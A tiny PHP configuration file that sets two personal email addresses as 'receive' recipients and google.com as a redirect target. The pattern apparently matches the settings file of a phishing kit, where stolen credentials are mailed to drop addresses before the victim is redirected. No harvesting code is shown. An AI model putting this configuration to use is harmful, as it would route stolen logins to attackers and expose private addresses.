<?php 
$Receive_email="wu.99331@gmail.com,nonok10@aol.com";
$redirect="https://www.google.com/";
?>